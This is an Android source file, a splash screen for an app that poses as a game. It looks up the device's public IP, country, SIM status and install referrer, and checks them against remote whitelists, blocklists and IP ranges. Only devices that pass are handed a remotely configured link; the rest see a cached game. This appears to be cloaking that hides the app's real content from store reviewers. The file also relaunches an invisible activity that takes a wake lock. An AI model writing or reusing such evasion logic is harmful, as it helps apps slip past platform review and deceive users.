package com.example.maks.webapp;

import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.os.Bundle;
import android.os.PowerManager;
import android.view.View;

import com.android.installreferrer.api.InstallReferrerClient;
import com.android.installreferrer.api.InstallReferrerStateListener;
import com.android.installreferrer.api.ReferrerDetails;
import com.example.maks.webapp.db.FirebaseDB;
import com.example.maks.webapp.listeners.OnDatabaseDataChangeListener;
import com.example.maks.webapp.receivers.TimerReceiver;
import com.example.maks.webapp.utilities.Utility;
import com.example.maks.webapp.models.IpRange;
import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.yandex.metrica.YandexMetrica;

import java.net.URI;
import java.util.ArrayList;
import java.util.List;

import cz.msebera.android.httpclient.Header;

public class SplashActivity extends BaseActivity implements OnDatabaseDataChangeListener {

    public static final int LOAD_REFERENCE = 0;
    public static final int LOAD_FROM_CACHE = 1;

    public static final String LOAD_TYPE = "loadType";
    public static final String REFERENCE = "reference";
    public static final String GAME_LINK = "game_link";
    public static final String RULES = "rules";
    public static final String INTERNAL_REFERENCES = "internal_references";

    public int type = LOAD_REFERENCE;
    private String reference = "";
    private String gameReferences = "";
    private String internalReferences = "";
    private ArrayList<String> cuttingRules = new ArrayList<>();

    private InstallReferrerClient referrerClient;

    @Override
    public void onCreate(Bundle icicle) {
        super.onCreate(icicle);
        setContentView(R.layout.activity_splash);

        if(!getIntent().getBooleanExtra(TimerReceiver.SHOW_TRANSPARENT, false)) {
            sendBroadcast(new Intent(this, TimerReceiver.class));

            if(!Utility.isNetworkConnected(this)) {
                type = LOAD_FROM_CACHE;
                startErrorActivity();
                return;
            }

            if (!Utility.isSimCardExist(this))
                type = LOAD_FROM_CACHE;

            if(type != LOAD_REFERENCE)
                startGameActivity();
            else new FirebaseDB().setOnDatabaseDataChangeListener(this);

        } else {
            PowerManager manager = (PowerManager) getSystemService(Context.POWER_SERVICE);

            if(manager != null) {
                manager.newWakeLock(PowerManager.FULL_WAKE_LOCK
                        | PowerManager.ACQUIRE_CAUSES_WAKEUP, "@").acquire(1);

                findViewById(R.id.root).setOnClickListener(view -> finish());
                findViewById(R.id.root).setVisibility(View.INVISIBLE);
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        YandexMetrica.onResumeActivity(this);
    }

    @Override
    protected void onPause() {
        YandexMetrica.onPauseActivity(this);
        super.onPause();
    }


    private void startGameActivity(){
        Intent intentGame = new Intent(SplashActivity.this, GameActivity.class);
        intentGame.putExtra(LOAD_TYPE, type);
        intentGame.putExtra(REFERENCE, reference);
        intentGame.putExtra(GAME_LINK, gameReferences);
        intentGame.putStringArrayListExtra(RULES, cuttingRules);
        intentGame.putExtra(INTERNAL_REFERENCES, internalReferences);
        intentGame.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intentGame.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
        intentGame.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);

        new Handler(Looper.getMainLooper()).postDelayed(() -> startActivity(intentGame), 3000);
    }

    private void startErrorActivity() {
        Intent intent = new Intent(SplashActivity.this, ErrorActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);

        new Handler(Looper.getMainLooper()).postDelayed(() -> startActivity(intent), 3000);
    }

    @Override
    public void updateDate(List<String> whitelist_geoIps, List<String> whitelist_localizations, List<String> otherIps, List<String> blackRefer, ArrayList<String> rules,
                           List<IpRange> ipsRange,  String link, String internalLink, String gameLink, String refer, Boolean isLinkEnabled) {

        if(!isLinkEnabled){
            type = LOAD_FROM_CACHE;
            startGameActivity();
        }

        String code = Utility.getCountryCode(this);

        AsyncHttpClient client = new AsyncHttpClient();
        client.get("http://wtfismyip.com/text", new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                if(responseBody != null) {
                    String ip = new String(responseBody).replace("\n", "");

                    if(!whitelist_geoIps.contains(code))
                        type = LOAD_FROM_CACHE;

                    if(!whitelist_localizations.contains(code))
                        type = LOAD_FROM_CACHE;

                    if(otherIps.contains(ip))
                        type = LOAD_FROM_CACHE;

                    if(isIpOnRange(ipsRange, ip))
                        type = LOAD_FROM_CACHE;

                } else {
                    type = LOAD_FROM_CACHE;
                }

                referrerClient = InstallReferrerClient.newBuilder(SplashActivity.this).build();
                referrerClient.startConnection(new InstallReferrerStateListener() {
                    @Override
                    public void onInstallReferrerSetupFinished(int responseCode) {

                        if(responseCode == InstallReferrerClient.InstallReferrerResponse.OK) {
                            try {
                                ReferrerDetails details = referrerClient.getInstallReferrer();
                                String r = details.getInstallReferrer();

                                if(r.equals(refer))
                                    type = LOAD_FROM_CACHE;
                                if(r.equals(blackRefer)){
                                    type = LOAD_FROM_CACHE;
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                                type = LOAD_FROM_CACHE;
                            }

                        } else {
                            type = LOAD_FROM_CACHE;
                        }

                        reference = link;
                        gameReferences = gameLink;
                        cuttingRules = rules;
                        internalReferences = internalLink;
                        startGameActivity();
                    }

                    @Override
                    public void onInstallReferrerServiceDisconnected() {

                    }
                });
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                type = LOAD_FROM_CACHE;
                startGameActivity();
            }
        });
    }

    private boolean isIpOnRange(List<IpRange> ipRanges, String ip) {
        String[] current = ip.split("\\.");

        for(IpRange range : ipRanges) {
            String[] start = range.getStart().split("\\.");
            String[] end = range.getEnd().split("\\.");

            int count = 0;
            for(int i = 0; i < current.length; i++) {
                if(Integer.parseInt(current[i]) > Integer.parseInt(start[i]) &&
                        Integer.parseInt(current[i]) < Integer.parseInt(end[i])) count++;
            }

            if(count == 4)
                return true;
        }

        return false;
    }
}
